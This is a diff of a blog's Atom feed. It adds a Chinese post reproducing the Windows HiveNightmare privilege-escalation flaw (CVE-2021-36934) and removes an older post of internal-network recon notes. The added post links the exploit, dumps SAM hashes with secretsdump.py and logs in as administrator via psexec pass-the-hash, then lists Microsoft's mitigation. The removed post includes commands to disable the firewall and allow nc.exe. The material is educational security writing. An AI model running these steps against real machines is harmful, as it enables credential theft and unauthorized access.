@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-07-22T09:57:53.839Z</updated>
+  <updated>2021-07-24T23:51:15.972Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现</title>
+    <link href="https://www.teamssix.com/year/210725-074847.html"/>
+    <id>https://www.teamssix.com/year/210725-074847.html</id>
+    <published>2021-07-24T23:48:47.000Z</published>
+    <updated>2021-07-24T23:51:15.972Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。</p><p>不过值得注意的是该漏洞不影响 Windows Server 版本。</p><p>对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。</p><p>根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。</p><p>目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。</p><h1 id="0x01-检查是否易受攻击"><a href="#0x01-检查是否易受攻击" class="headerlink" title="0x01 检查是否易受攻击"></a>0x01 检查是否易受攻击</h1><p>执行以下命令：</p><pre><code>icacls C:\windows\system32\config\sam</code></pre><p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png"></p><p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723111446.png"></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>EXP 地址为：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p>作者编译好的 exe 文件：<a href="https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe">https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe</a></p><p>直接将作者编译好的 HiveNightmare.exe 拷贝到目标系统上执行，这里以 Windows 10 1809 为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723132944.png"></p><p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p><p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p><p>在 Linux 下运行以下命令，以 Kali 为例。</p><pre><code>sudo apt-get install nimnimble install zippy argparsenimble install winimsudo apt-get install mingw-w64git clone https://github.com/HuskyHacks/ShadowSteal.git &amp;&amp; cd ShadowStealmake &amp;&amp; cd bin/ &amp;&amp; ls -l</code></pre><p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png"></p><p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p><pre><code>git clone https://github.com/SecureAuthCorp/impacket.gitcd impacket/examplespython3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png"></p><p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p><pre><code>python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png"></p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p><p>1、限制对 %windir%\system32\config 内容的访问</p><p>​    以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：icacls %windir%\system32\config*.* /inheritance:e</p><p>2、删除卷影复制服务 (VSS) 卷影副本</p><p>​    删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷，创建一个新的系统还原点（如果需要）。</p><p>​    不过在操作时需要注意的是，从系统中删除卷影副本会影响系统和文件的“恢复“操作。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg">https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247494395&idx=1&sn=c40e68e018c2112d7e3ce74b9a55c724">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247494395&amp;idx=1&amp;sn=c40e68e018c2112d7e3ce74b9a55c724</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 1</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
+    
+    <category term="Windows" scheme="https://www.teamssix.com/tags/Windows/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】15、系统服务权限配置不当利用</title>
@@ -540,37 +568,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;1、判断是否存在域&quot;&gt;&lt;a href=&quot;#1、判断是否存在域&quot; class=&quot;headerlink&quot; title=&quot;1、判断是否存在域&quot;&gt;&lt;/a&gt;1、判断是否存在域&lt;/h2&gt;&lt;h3 id=&quot;ipconfig&quot;&gt;&lt;a href=&quot;#ipconfig&quot; class=&quot;</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】3、本地工作组信息收集</title>
-    <link href="https://www.teamssix.com/year/210211-160909.html"/>
-    <id>https://www.teamssix.com/year/210211-160909.html</id>
-    <published>2021-02-11T08:09:09.000Z</published>
-    <updated>2021-02-11T08:35:00.687Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre><code>whoami </code></pre><ul><li>本机网络配置信息</li></ul><pre><code>ipconfig /all</code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; </code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></pre><ul><li>查看系统体系结构</li></ul><pre><code>echo %PROCESSOR_ARCHITECTURE%</code></pre><ul><li>查看系统所有环境变量</li></ul><pre><code>set</code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre><code>wmic product get name,version</code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></pre><ul><li>查询本机服务信息</li></ul><pre><code>wmic service list brief</code></pre><ul><li>查询进程列表</li></ul><pre><code>tasklist /v</code></pre><ul><li>wmic 查看进程信息</li></ul><pre><code>wmic process list brief</code></pre><ul><li>查看启动程序信息</li></ul><pre><code>wmic startup get command,caption</code></pre><ul><li>查看计划任务</li></ul><pre><code>schtasks /query /fo LIST /v</code></pre><ul><li>查看主机开启时间</li></ul><pre><code>net statistics workstation</code></pre><ul><li>查询用户列表</li></ul><pre><code>net user</code></pre><ul><li> 查看指定用户的信息</li></ul><pre><code>net user teamssix</code></pre><ul><li> 查看本地管理员用户</li></ul><pre><code>net localgroup administrators</code></pre><ul><li>查看当前在线用户</li></ul><pre><code>query user || qwinsta</code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre><code>net session</code></pre><ul><li>查看端口列表</li></ul><pre><code>netstat –ano</code></pre><ul><li>查看补丁列表</li></ul><pre><code>systeminfo</code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><ul><li>查看本机共享</li></ul><pre><code>net share</code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre><code>wmic share get name,path,status</code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre><code>route printarp –a</code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre><code>netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</code></pre><ul><li>查看防火墙配置</li></ul><pre><code>netsh firewall show config</code></pre><ul><li>修改防火墙配置</li></ul><pre><code>(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre><code>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre><code>wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_12-59-56.png"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_15-27-11.png"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a></p><p><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a></p><p><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;a href=&quot;#1、手动收集本地工作组信息&quot; class=&quot;headerlink&quot; title=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;/a&gt;1、手动收集本地工作组信息&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;查看当前权限&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p</summary>
       
     
     
